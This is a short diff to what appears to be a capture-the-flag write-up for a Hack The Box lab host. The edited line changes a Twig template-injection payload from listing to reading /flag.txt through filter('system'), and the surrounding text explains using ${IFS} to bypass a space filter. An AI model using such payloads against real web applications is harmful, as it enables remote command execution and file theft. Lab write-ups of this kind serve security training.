@@ -35,7 +35,7 @@
 <p>Since the application runs on Linux, this can be bypassed using <code>${IFS}</code>, which is equivalent to the <code>'  '</code> character</p>
 <p></p>
 <p>Read the flag:</p>
-<p>Payload: <code>http://truckapi.htb/?id=FusionExpress03{{['ls${IFS}/flag.txt']|filter('system')}}</code></p>
+<p>Payload: <code>http://truckapi.htb/?id=FusionExpress03{{['cat${IFS}/flag.txt']|filter('system')}}</code></p>
 <p></p>
 ]]></description>
 </item>
